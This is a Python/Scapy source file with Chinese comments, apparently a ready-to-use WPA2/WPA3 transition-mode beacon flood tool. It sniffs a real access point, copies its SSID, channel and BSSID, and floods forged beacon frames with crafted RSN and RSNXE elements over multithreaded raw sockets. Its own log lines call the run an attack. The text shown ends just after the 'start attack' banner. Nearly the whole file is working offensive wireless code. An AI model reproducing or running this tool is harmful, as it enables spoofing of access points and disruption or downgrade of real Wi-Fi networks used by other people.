#!/usr/bin/env python3
"""
WPA2/WPA3 Transition Mode Beacon Flood
支持纯WPA3 / 过渡模式 / 自动嗅探模式匹配
高性能版本：预缓存 + 模板帧动态修改
"""
from scapy.all import *
import random
import string
import threading
import time
import subprocess
import sys
import os
import struct
import socket
import argparse

# ==================== 配置区 ====================
CONFIG = {
    'target_mac':      'ff:ff:ff:ff:ff:ff',
    'ap_mac':          'BB:BB:BB:BB:BB:BB',
    'ssid':            'TargetNetwork',
    'interface':       'wlan0',
    'channel':         5,
    'threads':         4,
    'mode':            'transition',
    'beacon_interval': 100,
    'randomize_seq':   True,
    'use_raw_socket':  True,
    'precache_size':   64,       # 预缓存帧数量
    'send_mode':       'template',  # template / precache / legacy
}

# ==================== 全局状态 ====================
stats_lock = threading.Lock()
stats = {
    'sent':       0,
    'errors':     0,
    'start_time': None,
    'running':    True,
}

# ==================== 工具函数 ====================


def log_info(msg):
    print(f"[*] {msg}")


def log_ok(msg):
    print(f"[+] {msg}")


def log_err(msg):
    print(f"[!] {msg}")


def log_warn(msg):
    print(f"[~] {msg}")


def check_root():
    if os.geteuid() != 0:
        log_err("需要root权限运行")
        sys.exit(1)


def check_monitor_mode(iface):
    try:
        result = subprocess.run(
            ['iwconfig', iface],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode != 0:
            log_err(f"接口 {iface} 不存在")
            sys.exit(1)
        if 'Monitor' not in result.stdout:
            log_err(f"{iface} 未处于Monitor模式")
            log_info(f"请先执行: airmon-ng start {iface}")
            sys.exit(1)
        log_ok(f"接口 {iface} 已确认Monitor模式")
    except FileNotFoundError:
        log_err("未找到iwconfig命令，请安装wireless-tools")
        sys.exit(1)


def set_channel(iface, channel):
    channel = int(channel)
    if channel < 1 or channel > 196:
        log_err(f"无效信道: {channel}")
        sys.exit(1)
    ret = subprocess.run(
        ['iwconfig', iface, 'channel', str(channel)],
        capture_output=True, text=True
    )
    if ret.returncode != 0:
        log_err(f"信道设置失败: {ret.stderr.strip()}")
        sys.exit(1)
    log_ok(f"信道已设置为 {channel}")


def get_timestamp():
    return int(time.time() * 1000000) & 0xFFFFFFFFFFFFFFFF


def random_seq():
    frag = 0
    seq = random.randint(0, 4095)
    return (seq << 4) | frag

# ==================== RSN 构造器 ====================


class RSNBuilder:
    OUI = b'\x00\x0f\xac'

    CIPHER_CCMP_128 = OUI + b'\x04'
    CIPHER_GCMP_128 = OUI + b'\x08'
    CIPHER_CCMP_256 = OUI + b'\x0a'
    CIPHER_GCMP_256 = OUI + b'\x09'

    AKM_PSK = OUI + b'\x02'
    AKM_PSK_SHA256 = OUI + b'\x06'
    AKM_SAE = OUI + b'\x08'
    AKM_FT_SAE = OUI + b'\x09'
    AKM_EAP = OUI + b'\x01'
    AKM_EAP_SHA256 = OUI + b'\x05'
    AKM_SUITE_B_192 = OUI + b'\x0c'
    AKM_OWE = OUI + b'\x12'

    BIP_CMAC_128 = OUI + b'\x06'
    BIP_GMAC_128 = OUI + b'\x0b'
    BIP_GMAC_256 = OUI + b'\x0c'
    BIP_CMAC_256 = OUI + b'\x0d'

    @staticmethod
    def _encode_rsn_capabilities(
        preauth=False,
        ptksa_replay=1,
        gtksa_replay=1,
        mfp_required=False,
        mfp_capable=False,
        joint_multiband=False,
        peerkey=False,
        spp_amsdu_capable=False,
        spp_amsdu_required=False,
        pbac=False,
        ext_key_id=False,
        ocvc=False,
    ):
        word = 0
        if preauth:
            word |= (1 << 0)
        word |= (ptksa_replay & 0x03) << 2
        word |= (gtksa_replay & 0x03) << 4
        if mfp_required:
            word |= (1 << 6)
        if mfp_capable:
            word |= (1 << 7)
        if joint_multiband:
            word |= (1 << 8)
        if peerkey:
            word |= (1 << 9)
        if spp_amsdu_capable:
            word |= (1 << 10)
        if spp_amsdu_required:
            word |= (1 << 11)
        if pbac:
            word |= (1 << 12)
        if ext_key_id:
            word |= (1 << 13)
        if ocvc:
            word |= (1 << 14)
        return struct.pack('<H', word)

    @classmethod
    def build_wpa3_only(cls):
        rsn_cap = cls._encode_rsn_capabilities(
            ptksa_replay=1, gtksa_replay=1,
            mfp_required=True, mfp_capable=True,
        )
        info = b''
        info += b'\x01\x00'
        info += cls.CIPHER_CCMP_128
        info += struct.pack('<H', 1)
        info += cls.CIPHER_CCMP_128
        info += struct.pack('<H', 1)
        info += cls.AKM_SAE
        info += rsn_cap
        info += struct.pack('<H', 0)
        info += cls.BIP_CMAC_128
        return Dot11Elt(ID=48, info=info)

    @classmethod
    def build_transition(cls):
        rsn_cap = cls._encode_rsn_capabilities(
            ptksa_replay=1, gtksa_replay=1,
            mfp_required=False, mfp_capable=True,
        )
        info = b''
        info += b'\x01\x00'
        info += cls.CIPHER_CCMP_128
        info += struct.pack('<H', 1)
        info += cls.CIPHER_CCMP_128
        info += struct.pack('<H', 2)
        info += cls.AKM_PSK
        info += cls.AKM_SAE
        info += rsn_cap
        info += struct.pack('<H', 0)
        info += cls.BIP_CMAC_128
        return Dot11Elt(ID=48, info=info)

    @classmethod
    def build_transition_ft(cls):
        rsn_cap = cls._encode_rsn_capabilities(
            ptksa_replay=1, gtksa_replay=1,
            mfp_required=False, mfp_capable=True,
        )
        info = b''
        info += b'\x01\x00'
        info += cls.CIPHER_CCMP_128
        info += struct.pack('<H', 1)
        info += cls.CIPHER_CCMP_128
        info += struct.pack('<H', 3)
        info += cls.AKM_PSK
        info += cls.AKM_SAE
        info += cls.AKM_FT_SAE
        info += rsn_cap
        info += struct.pack('<H', 0)
        info += cls.BIP_CMAC_128
        return Dot11Elt(ID=48, info=info)

    @classmethod
    def build_enterprise(cls):
        rsn_cap = cls._encode_rsn_capabilities(
            ptksa_replay=1, gtksa_replay=1,
            mfp_required=True, mfp_capable=True,
        )
        info = b''
        info += b'\x01\x00'
        info += cls.CIPHER_CCMP_128
        info += struct.pack('<H', 1)
        info += cls.CIPHER_CCMP_128
        info += struct.pack('<H', 1)
        info += cls.AKM_EAP_SHA256
        info += rsn_cap
        info += struct.pack('<H', 0)
        info += cls.BIP_CMAC_128
        return Dot11Elt(ID=48, info=info)

# ==================== IE 构造器 ====================


class IEBuilder:

    @staticmethod
    def ssid(name):
        if isinstance(name, str):
            name = name.encode('utf-8')
        return Dot11Elt(ID=0, info=name)

    @staticmethod
    def supported_rates():
        rates = bytes([0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24])
        return Dot11Elt(ID=1, info=rates)

    @staticmethod
    def ds_parameter(channel):
        return Dot11Elt(ID=3, info=bytes([channel & 0xFF]))

    @staticmethod
    def tim():
        tim_info = bytes([0x00, 0x01, 0x00, 0x00])
        return Dot11Elt(ID=5, info=tim_info)

    @staticmethod
    def country(code='US'):
        info = code.encode('ascii') + b'\x20'
        info += bytes([1, 11, 30])
        if len(info) % 2 == 1:
            info += b'\x00'
        return Dot11Elt(ID=7, info=info)

    @staticmethod
    def extended_rates():
        rates = bytes([0x30, 0x48, 0x60, 0x6c])
        return Dot11Elt(ID=50, info=rates)

    @staticmethod
    def ht_capabilities():
        ht_cap_info = struct.pack('<H', 0x402d)
        ampdu_params = b'\x17'
        mcs_set = (
            b'\xff\xff\x00\x00'
            b'\x00\x00\x00\x00'
            b'\x00\x00\x00\x00'
            b'\x01\x00\x00\x00'
        )
        ht_ext_cap = struct.pack('<H', 0x0000)
        txbf_cap = struct.pack('<I', 0x00000000)
        asel_cap = b'\x00'
        info = (
            ht_cap_info + ampdu_params + mcs_set +
            ht_ext_cap + txbf_cap + asel_cap
        )
        return Dot11Elt(ID=45, info=info)

    @staticmethod
    def ht_information(channel):
        primary_channel = channel & 0xFF
        ht_info_subset1 = b'\x00'
        ht_info_subset2 = struct.pack('<H', 0)
        ht_info_subset3 = struct.pack('<H', 0)
        basic_mcs = b'\x00' * 16
        info = (
            bytes([primary_channel]) +
            ht_info_subset1 + ht_info_subset2 +
            ht_info_subset3 + basic_mcs
        )
        return Dot11Elt(ID=61, info=info)

    @staticmethod
    def extended_capabilities():
        ext_cap = bytearray(8)
        ext_cap[0] |= 0x04
        ext_cap[2] |= 0x08
        ext_cap[5] |= 0x40
        ext_cap[7] |= 0x40
        return Dot11Elt(ID=127, info=bytes(ext_cap))

    @staticmethod
    def rsnxe(sae_h2e=True, sae_pk=False):
        rsnxe_byte = 0x00
        if sae_h2e:
            rsnxe_byte |= 0x20
        if sae_pk:
            rsnxe_byte |= 0x40
        rsnxe_info = bytes([rsnxe_byte])
        return Dot11Elt(ID=244, info=rsnxe_info)

    @staticmethod
    def vendor_wpa(transition=True):
        if not transition:
            return None
        wpa_oui = b'\x00\x50\xf2'
        wpa_type = b'\x01'
        wpa_ver = b'\x01\x00'
        group_cs = wpa_oui + b'\x04'
        pw_count = b'\x01\x00'
        pw_cs = wpa_oui + b'\x04'
        akm_count = b'\x01\x00'
        akm_cs = wpa_oui + b'\x02'
        info = (
            wpa_oui + wpa_type + wpa_ver +
            group_cs + pw_count + pw_cs +
            akm_count + akm_cs
        )
        return Dot11Elt(ID=221, info=info)

    @staticmethod
    def wmm():
        oui_type = b'\x00\x50\xf2\x02\x01\x01'
        qos_info = b'\x80'
        ac_be = bytes([0x03, 0xa4, 0x00, 0x00])
        ac_bk = bytes([0x27, 0xa4, 0x00, 0x00])
        ac_vi = bytes([0x42, 0x43, 0x5e, 0x00])
        ac_vo = bytes([0x62, 0x32, 0x2f, 0x00])
        info = oui_type + qos_info + b'\x00' + ac_be + ac_bk + ac_vi + ac_vo
        return Dot11Elt(ID=221, info=info)

# ==================== AP 信息嗅探 ====================


class APSniffer:
    def __init__(self, iface, target_bssid=None, target_ssid=None, timeout=10):
        self.iface = iface
        self.target_bssid = target_bssid.lower() if target_bssid else None
        self.target_ssid = target_ssid
        self.timeout = timeout
        self.result = None

    def _packet_handler(self, pkt):
        if not pkt.haslayer(Dot11Beacon):
            return
        bssid = pkt[Dot11].addr2
        if not bssid:
            return

        # 匹配目标
        match = False
        ssid = ''

        # 提取SSID
        ssid_elt = pkt.getlayer(Dot11Elt, ID=0)
        if ssid_elt:
            try:
                ssid = ssid_elt.info.decode('utf-8', errors='ignore')
            except:
                ssid = ''

        # BSSID匹配或SSID匹配（任一命中即可）
        if self.target_bssid and bssid.lower() == self.target_bssid:
            match = True
        if self.target_ssid and ssid == self.target_ssid:
            match = True
        # 如果两个都指定了，需要至少一个匹配
        if not self.target_bssid and not self.target_ssid:
            return
        if not match:
            return

        # 提取RSN信息
        rsn_elt = pkt.getlayer(Dot11Elt, ID=48)
        has_wpa3 = False
        has_wpa2 = False
        is_transition = False
        if rsn_elt and rsn_elt.info:
            hex_data = rsn_elt.info.hex()
            if '000fac08' in hex_data:
                has_wpa3 = True
            if '000fac02' in hex_data:
                has_wpa2 = True
            is_transition = has_wpa2 and has_wpa3

        # 提取信道
        ds_elt = pkt.getlayer(Dot11Elt, ID=3)
        channel = ds_elt.info[0] if ds_elt and ds_elt.info else 0

        # 检查RSNXE
        rsnxe_elt = pkt.getlayer(Dot11Elt, ID=244)
        has_rsnxe = rsnxe_elt is not None

        self.result = {
            'bssid':         bssid,
            'ssid':          ssid,
            'channel':       channel,
            'has_wpa3':      has_wpa3,
            'has_wpa2':      has_wpa2,
            'is_transition': is_transition,
            'has_rsnxe':     has_rsnxe,
            'raw_rsn':       rsn_elt.info if rsn_elt else None,
            'beacon_raw':    pkt,
        }

    def scan(self):
        log_info(f"嗅探目标AP信息 (超时: {self.timeout}s)...")
        log_info(f"  目标BSSID: {self.target_bssid or '任意'}")
        log_info(f"  目标SSID : {self.target_ssid or '任意'}")
        try:
            sniff(
                iface=self.iface,
                prn=self._packet_handler,
                stop_filter=lambda p: self.result is not None,
                timeout=self.timeout,
                store=False,
            )
        except Exception as e:
            log_err(f"嗅探失败: {e}")
            return None

        if self.result:
            r = self.result
            log_ok(f"找到目标AP:")
            log_info(f"  BSSID    : {r['bssid']}")
            log_info(f"  SSID     : {r['ssid']}")
            log_info(f"  信道     : {r['channel']}")
            log_info(f"  WPA2     : {'是' if r['has_wpa2'] else '否'}")
            log_info(f"  WPA3     : {'是' if r['has_wpa3'] else '否'}")
            log_info(f"  过渡模式 : {'是' if r['is_transition'] else '否'}")
            log_info(f"  RSNXE    : {'是' if r['has_rsnxe'] else '否'}")
        else:
            log_warn("未找到目标AP")
        return self.result

# ==================== 帧构造器 ====================


class BeaconBuilder:
    def __init__(self, config):
        self.config = config
        self.seq_counter = 0

    def _next_seq(self):
        if self.config['randomize_seq']:
            return random_seq()
        else:
            self.seq_counter = (self.seq_counter + 1) % 4096
            return self.seq_counter << 4

    def build(self, mode=None):
        if mode is None:
            mode = self.config['mode']
        cfg = self.config
        channel = cfg['channel']
        is_transition = mode in ('transition', 'transition_ft')

        dot11 = Dot11(
            type=0, subtype=8,
            addr1='ff:ff:ff:ff:ff:ff',
            addr2=cfg['ap_mac'],
            addr3=cfg['ap_mac'],
            SC=self._next_seq(),
        )

        beacon = Dot11Beacon(
            timestamp=get_timestamp(),
            beacon_interval=cfg['beacon_interval'],
            cap='ESS+privacy',
        )

        if mode == 'wpa3_only':
            rsn = RSNBuilder.build_wpa3_only()
        elif mode == 'transition':
            rsn = RSNBuilder.build_transition()
        elif mode == 'transition_ft':
            rsn = RSNBuilder.build_transition_ft()
        elif mode == 'enterprise':
            rsn = RSNBuilder.build_enterprise()
        else:
            rsn = RSNBuilder.build_transition()

        frame = (
            RadioTap() /
            dot11 /
            beacon /
            IEBuilder.ssid(cfg['ssid']) /
            IEBuilder.supported_rates() /
            IEBuilder.ds_parameter(channel) /
            IEBuilder.tim() /
            IEBuilder.country() /
            IEBuilder.ht_capabilities() /
            rsn /
            IEBuilder.extended_rates() /
            IEBuilder.ht_information(channel) /
            IEBuilder.extended_capabilities() /
            IEBuilder.wmm()
        )

        if is_transition:
            wpa_ie = IEBuilder.vendor_wpa(transition=True)
            if wpa_ie:
                frame = frame / wpa_ie

        if mode in ('wpa3_only', 'transition', 'transition_ft'):
            frame = frame / IEBuilder.rsnxe(sae_h2e=True, sae_pk=False)

        return frame

    def build_template(self, mode=None):
        """
        构造模板帧并返回 (raw_bytes, sc_offset, ts_offset)
        用于高性能发送时仅修改序列号和时间戳
        """
        frame = self.build(mode)
        raw = bytearray(bytes(frame))

        # 解析RadioTap长度
        radiotap_len = struct.unpack_from('<H', raw, 2)[0]

        # Dot11 header: FC(2) + Duration(2) + Addr1(6) + Addr2(6) + Addr3(6) = 22
        # SC字段在Dot11 header偏移22处
        sc_offset = radiotap_len + 22

        # Beacon fixed fields在Dot11 header之后
        # Dot11 header总长 = 24 bytes (包括SC的2字节)
        # Beacon: timestamp(8) + interval(2) + cap(2)
        ts_offset = radiotap_len + 24

        return raw, sc_offset, ts_offset

# ==================== 发送引擎 ====================


class FloodEngine:
    def __init__(self, config, builder):
        self.config = config
        self.builder = builder
        self.threads = []

    def _create_raw_socket(self):
        """创建并绑定原始套接字"""
        sock = socket.socket(
            socket.AF_PACKET,
            socket.SOCK_RAW,
            socket.htons(0x0003)
        )
        sock.bind((self.config['interface'], 0))
        return sock

    def _worker_template(self):
        """
        模板帧发送线程（最高性能）
        预构造帧字节，每次只修改序列号和时间戳
        """
        try:
            sock = self._create_raw_socket()
        except Exception as e:
            log_err(f"套接字创建失败: {e}")
            return

        # 构造模板
        template, sc_offset, ts_offset = self.builder.build_template()
        frame_buf = bytearray(template)

        local_count = 0
        batch_size = 500
        seq_num = random.randint(0, 4095)

        while stats['running']:
            try:
                # 更新序列号 (2字节)
                seq_num = (seq_num + 1) & 0x0FFF
                sc_val = (seq_num << 4) & 0xFFFF
                struct.pack_into('<H', frame_buf, sc_offset, sc_val)

                # 更新时间戳 (8字节)
                ts_val = int(time.time() * 1000000) & 0xFFFFFFFFFFFFFFFF
                struct.pack_into('<Q', frame_buf, ts_offset, ts_val)

                sock.send(frame_buf)
                local_count += 1

                if local_count >= batch_size:
                    with stats_lock:
                        stats['sent'] += local_count
                    local_count = 0

            except OSError as e:
                with stats_lock:
                    stats['errors'] += 1
                # 网卡busy时短暂等待
                time.sleep(0.0001)
            except Exception as e:
                with stats_lock:
                    stats['errors'] += 1
                time.sleep(0.001)

        if local_count > 0:
            with stats_lock:
                stats['sent'] += local_count
        sock.close()

    def _worker_precache(self):
        """
        预缓存发送线程
        预先构造多帧的原始字节，轮询发送
        """
        try:
            sock = self._create_raw_socket()
        except Exception as e:
            log_err(f"套接字创建失败: {e}")
            return

        # 预构造帧缓存
        cache_size = self.config.get('precache_size', 64)
        frame_cache = []
        log_info(
            f"线程 {threading.current_thread().name}: 预构造 {cache_size} 帧...")
        for _ in range(cache_size):
            frame = self.builder.build()
            frame_cache.append(bytes(frame))

        local_count = 0
        batch_size = 500
        cache_idx = 0

        while stats['running']:
            try:
                sock.send(frame_cache[cache_idx])
                cache_idx = (cache_idx + 1) % cache_size
                local_count += 1

                if local_count >= batch_size:
                    with stats_lock:
                        stats['sent'] += local_count
                    local_count = 0

            except OSError:
                with stats_lock:
                    stats['errors'] += 1
                time.sleep(0.0001)
            except Exception:
                with stats_lock:
                    stats['errors'] += 1
                time.sleep(0.001)

        if local_count > 0:
            with stats_lock:
                stats['sent'] += local_count
        sock.close()

    def _worker_legacy_raw(self):
        """
        传统原始套接字发送线程（每次构造帧）
        兼容性好但性能低
        """
        try:
            sock = self._create_raw_socket()
        except Exception as e:
            log_err(f"套接字创建失败: {e}")
            return

        local_count = 0
        batch_size = 50

        while stats['running']:
            try:
                frame = self.builder.build()
                sock.send(bytes(frame))
                local_count += 1

                if local_count >= batch_size:
                    with stats_lock:
                        stats['sent'] += local_count
                    local_count = 0
            except Exception:
                with stats_lock:
                    stats['errors'] += 1
                time.sleep(0.01)

        if local_count > 0:
            with stats_lock:
                stats['sent'] += local_count
        sock.close()

    def _worker_scapy(self):
        """Scapy sendp发送线程（兼容模式）"""
        local_count = 0
        batch_size = 50

        while stats['running']:
            try:
                frames = [self.builder.build() for _ in range(10)]
                sendp(frames, iface=self.config['interface'],
                      verbose=False, inter=0)
                local_count += 10
                if local_count >= batch_size:
                    with stats_lock:
                        stats['sent'] += local_count
                    local_count = 0
            except Exception:
                with stats_lock:
                    stats['errors'] += 1
                time.sleep(0.01)

        if local_count > 0:
            with stats_lock:
                stats['sent'] += local_count

    def _stats_printer(self):
        """统计信息输出线程"""
        mode_names = {
            'wpa3_only':     'WPA3-Only (SAE)',
            'transition':    'WPA2/WPA3 Transition',
            'transition_ft': 'WPA2/WPA3 + FT',
            'enterprise':    'WPA3-Enterprise',
        }
        send_mode_names = {
            'template':  '模板帧',
            'precache':  '预缓存',
            'legacy':    '传统构造',
            'scapy':     'Scapy',
        }
        mode_name = mode_names.get(self.config['mode'], self.config['mode'])
        send_name = send_mode_names.get(self.config['send_mode'], '?')

        last_sent = 0
        while stats['running']:
            time.sleep(1)
            if not stats['running']:
                break
            elapsed = time.time() - stats['start_time']
            with stats_lock:
                sent = stats['sent']
                errors = stats['errors']

            # 计算瞬时速率
            instant_rate = sent - last_sent
            last_sent = sent
            avg_rate = sent / elapsed if elapsed > 0 else 0

            sys.stdout.write(
                f"[{'=' * 50}] "
                f"{mode_name} | {send_name} | "
                f"已发: {sent:>9,d} | "
                f"瞬时: {instant_rate:>7,d}/s | "
                f"均速: {avg_rate:>7,.0f}/s | "
                f"错误: {errors:>4d} | "
                f"{elapsed:>5.0f}s"
            )
            sys.stdout.flush()

    def start(self):
        stats['start_time'] = time.time()
        stats['running']    = True
        stats['sent']       = 0
        stats['errors']     = 0

        # 选择发送方式
        send_mode = self.config.get('send_mode', 'template')

        if not self.config['use_raw_socket']:
            send_mode = 'scapy'

        worker_fn = None
        if send_mode == 'template':
            worker_fn = self._worker_template
            log_info("发送模式: 模板帧动态修改 (最高性能)")
            log_info("  每帧仅修改 序列号(2B) + 时间戳(8B)")
        elif send_mode == 'precache':
            worker_fn = self._worker_precache
            log_info(f"发送模式: 预缓存 ({self.config.get('precache_size', 64)} 帧)")
        elif send_mode == 'legacy':
            worker_fn = self._worker_legacy_raw
            log_info("发送模式: 传统原始套接字 (每次构造帧)")
        elif send_mode == 'scapy':
            worker_fn = self._worker_scapy
            log_info("发送模式: Scapy sendp (兼容模式)")
        else:
            worker_fn = self._worker_template
            log_warn(f"未知发送模式 '{send_mode}'，使用模板帧模式")

        # 启动发送线程
        for i in range(self.config['threads']):
            t = threading.Thread(
                target=worker_fn,
                name=f"FloodWorker-{i}",
                daemon=True
            )
            t.start()
            self.threads.append(t)
        log_ok(f"已启动 {self.config['threads']} 个发送线程")

        # 启动统计线程
        t_stats = threading.Thread(
            target=self._stats_printer,
            name="StatsPrinter",
            daemon=True
        )
        t_stats.start()

    def stop(self):
        stats['running'] = False
        # 等待线程结束
        for t in self.threads:
            t.join(timeout=2)
        time.sleep(0.5)

        elapsed = time.time() - stats['start_time']
        sent    = stats['sent']
        errors  = stats['errors']
        rate    = sent / elapsed if elapsed > 0 else 0

        print()
        print()
        print(f"{'=' * 60}")
        print(f"  攻击结束 — 统计摘要")
        print(f"{'=' * 60}")
        print(f"  模式       : {self.config['mode']}")
        print(f"  发送方式   : {self.config.get('send_mode', 'template')}")
        print(f"  目标SSID   : {self.config['ssid']}")
        print(f"  伪造BSSID  : {self.config['ap_mac']}")
        print(f"  总发送帧   : {sent:,d}")
        print(f"  总错误数   : {errors:,d}")
        print(f"  运行时间   : {elapsed:.1f} 秒")
        print(f"  平均速率   : {rate:,.0f} pps")
        print(f"{'=' * 60}")

# ==================== 帧验证 ====================
def validate_frame(builder):
    frame = builder.build()
    raw   = bytes(frame)

    log_info(f"帧验证:")
    log_info(f"  总长度     : {len(raw)} bytes")

    checks = {
        'RadioTap':     frame.haslayer(RadioTap),
        'Dot11':        frame.haslayer(Dot11),
        'Dot11Beacon':  frame.haslayer(Dot11Beacon),
    }

    ie_checks = {
        'SSID (ID=0)':         False,
        'Rates (ID=1)':        False,
        'DS (ID=3)':           False,
        'RSN (ID=48)':         False,
        'HT Cap (ID=45)':      False,
        'Ext Cap (ID=127)':    False,
        'RSNXE (ID=244)':      False,
    }
    ie_id_map = {
        0: 'SSID (ID=0)', 1: 'Rates (ID=1)', 3: 'DS (ID=3)',
        48: 'RSN (ID=48)', 45: 'HT Cap (ID=45)',
        127: 'Ext Cap (ID=127)', 244: 'RSNXE (ID=244)'
    }

    elt = frame.getlayer(Dot11Elt)
    while elt:
        if elt.ID in ie_id_map:
            ie_checks[ie_id_map[elt.ID]] = True
        elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None

    all_ok = True
    for name, present in {**checks, **ie_checks}.items():
        status = "✅" if present else "❌"
        if not present:
            all_ok = False
        log_info(f"  {status} {name}")

    rsn_elt = frame.getlayer(Dot11Elt, ID=48)
    if rsn_elt and rsn_elt.info:
        hex_str = rsn_elt.info.hex()
        akm_sae = '000fac08' in hex_str
        akm_psk = '000fac02' in hex_str
        bip     = '000fac06' in hex_str
        log_info(f"  RSN 详情:")
        log_info(f"    {'✅' if akm_sae else '❌'} AKM-SAE (WPA3)")
        log_info(f"    {'✅' if akm_psk else '⬜'} AKM-PSK (WPA2)")
        log_info(f"    {'✅' if bip else '❌'} BIP-CMAC-128 (Group Mgmt)")
        log_info(f"    RSN长度: {len(rsn_elt.info)} bytes")
        if not bip:
            log_warn("  ⚠️  缺少Group Management Cipher")
            all_ok = False

    # 验证模板偏移
    try:
        template, sc_offset, ts_offset = builder.build_template()
        log_info(f"  模板帧信息:")
        log_info(f"    模板长度   : {len(template)} bytes")
        log_info(f"    SC偏移     : {sc_offset}")
        log_info(f"    时间戳偏移 : {ts_offset}")

        # 验证偏移合理性
        radiotap_len = struct.unpack_from('<H', template, 2)[0]
        log_info(f"    RadioTap长 : {radiotap_len} bytes")

        if sc_offset < radiotap_len or sc_offset >= len(template) - 1:
            log_warn(f"    ⚠️ SC偏移可能不正确")
            all_ok = False
        else:
            # 读取当前SC值验证
            sc_val = struct.unpack_from('<H', template, sc_offset)[0]
            log_info(f"    当前SC值   : 0x{sc_val:04x} (seq={sc_val >> 4}, frag={sc_val & 0xf})")

        if ts_offset < radiotap_len or ts_offset >= len(template) - 7:
            log_warn(f"    ⚠️ 时间戳偏移可能不正确")
            all_ok = False
        else:
            ts_val = struct.unpack_from('<Q', template, ts_offset)[0]
            log_info(f"    当前时间戳 : {ts_val}")

    except Exception as e:
        log_err(f"  模板构造失败: {e}")
        all_ok = False

    if all_ok:
        log_ok("帧验证通过 ✅")
    else:
        log_warn("帧验证存在缺失项 ⚠️")

    return all_ok

# ==================== 主程序 ====================
def parse_args():
    parser = argparse.ArgumentParser(
        description='WPA2/WPA3 Transition Mode Beacon Flood Tool (High Performance)',
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument('-i', '--interface', default=CONFIG['interface'],
                        help=f"Monitor模式接口 (默认: {CONFIG['interface']})")
    parser.add_argument('-b', '--bssid', default=CONFIG['ap_mac'],
                        help=f"伪造的AP MAC (默认: {CONFIG['ap_mac']})")
    parser.add_argument('-s', '--ssid', default=CONFIG['ssid'],
                        help=f"目标SSID (默认: {CONFIG['ssid']})")
    parser.add_argument('-c', '--channel', type=int, default=CONFIG['channel'],
                        help=f"信道 (默认: {CONFIG['channel']})")
    parser.add_argument('-t', '--threads', type=int, default=CONFIG['threads'],
                        help=f"发送线程数 (默认: {CONFIG['threads']})")
    parser.add_argument('-m', '--mode', default=CONFIG['mode'],
                        choices=['wpa3_only', 'transition', 'transition_ft',
                                 'enterprise', 'auto'],
                        help="(默认: {CONFIG['mode']})")
    parser.add_argument('--send-mode', default=CONFIG['send_mode'],
                        choices=['template', 'precache', 'legacy', 'scapy'],
                        help="发送方式:"
                             "  template  — 模板帧动态修改(最快)"
                             "  precache  — 预缓存帧轮询发送"
                             "  legacy    — 传统每次构造(慢)"
                             "  scapy     — Scapy sendp(兼容)"
                             f"  (默认: {CONFIG['send_mode']})")
    parser.add_argument('--precache-size', type=int, default=CONFIG['precache_size'],
                        help=f"预缓存帧数量 (默认: {CONFIG['precache_size']})")
    parser.add_argument('--validate', action='store_true',
                        help="仅验证帧结构，不发送")
    parser.add_argument('--scan-timeout', type=int, default=10,
                        help="auto模式嗅探超时(秒)")
    parser.add_argument('--scan-bssid', default=None,
                        help="auto模式嗅探的真实AP BSSID (可选)")
    return parser.parse_args()


def main():
    args = parse_args()

    # 更新配置
    CONFIG['interface']      = args.interface
    CONFIG['ap_mac']         = args.bssid
    CONFIG['ssid']           = args.ssid
    CONFIG['channel']        = args.channel
    CONFIG['threads']        = args.threads
    CONFIG['mode']           = args.mode
    CONFIG['send_mode']      = args.send_mode
    CONFIG['precache_size']  = args.precache_size

    if args.send_mode == 'scapy':
        CONFIG['use_raw_socket'] = False
    else:
        CONFIG['use_raw_socket'] = True

    # Banner
    print()
    print(f"{'=' * 60}")
    print(f"  WPA2/WPA3 Transition Beacon Flood (High Performance)")
    print(f"{'=' * 60}")

    check_root()
    check_monitor_mode(CONFIG['interface'])
    set_channel(CONFIG['interface'], CONFIG['channel'])

    # Auto模式嗅探
    if CONFIG['mode'] == 'auto':
        # auto模式下，用 --scan-bssid 指定真实AP的MAC进行匹配
        # 或者仅通过SSID匹配
        scan_bssid = args.scan_bssid  # 这是真实AP的MAC
        scan_ssid  = CONFIG['ssid']

        if not scan_bssid and not scan_ssid:
            log_err("auto模式需要至少指定 --ssid 或 --scan-bssid")
            sys.exit(1)

        sniffer = APSniffer(
            iface=CONFIG['interface'],
            target_bssid=scan_bssid,
            target_ssid=scan_ssid,
            timeout=args.scan_timeout,
        )
        result = sniffer.scan()

        if result:
            if result['is_transition']:
                CONFIG['mode'] = 'transition'
            elif result['has_wpa3']:
                CONFIG['mode'] = 'wpa3_only'
            else:
                CONFIG['mode'] = 'transition'
                log_warn("未检测到WPA3，使用过渡模式")

            if result['channel'] > 0:
                CONFIG['channel'] = result['channel']
                set_channel(CONFIG['interface'], CONFIG['channel'])

            # 使用真实AP的BSSID作为伪造MAC（如果未手动指定）
            if args.bssid == 'BB:BB:BB:BB:BB:BB' and result['bssid']:
                CONFIG['ap_mac'] = result['bssid']
                log_info(f"使用嗅探到的BSSID: {CONFIG['ap_mac']}")

            log_ok(f"自动选择模式: {CONFIG['mode']}")
        else:
            log_warn("嗅探失败，使用默认过渡模式")
            CONFIG['mode'] = 'transition'

    # 打印配置
    mode_desc = {
        'wpa3_only':     'WPA3-Only (SAE + MFP Required)',
        'transition':    'WPA2/WPA3 Transition (PSK+SAE, MFP Capable)',
        'transition_ft': 'WPA2/WPA3 + Fast Transition (PSK+SAE+FT)',
        'enterprise':    'WPA3-Enterprise (EAP-SHA256)',
    }
    send_desc = {
        'template':  '模板帧动态修改 (最高性能)',
        'precache':  f'预缓存 ({CONFIG["precache_size"]} 帧)',
        'legacy':    '传统每次构造 (慢)',
        'scapy':     'Scapy sendp (兼容)',
    }

    print()
    log_info(f"配置信息:")
    log_info(f"  接口       : {CONFIG['interface']}")
    log_info(f"  伪造BSSID  : {CONFIG['ap_mac']}")
    log_info(f"  SSID       : {CONFIG['ssid']}")
    log_info(f"  信道       : {CONFIG['channel']}")
    log_info(f"  线程数     : {CONFIG['threads']}")
    log_info(f"  攻击模式   : {mode_desc.get(CONFIG['mode'], CONFIG['mode'])}")
    log_info(f"  发送方式   : {send_desc.get(CONFIG['send_mode'], CONFIG['send_mode'])}")
    print()

    # 构造器
    builder = BeaconBuilder(CONFIG)

    # 帧验证
    log_info("验证帧结构...")
    validate_frame(builder)
    print()

    if args.validate:
        log_info("仅验证模式，退出")
        frame = builder.build()
        print()
        log_info("帧 Hex Dump:")
        hexdump(frame)
        return

    # 启动攻击
    print(f"{'=' * 60}")
    log_info("开始攻击，按 Ctrl+C 停止")
    print(f"{'=' * 60}")
    print()
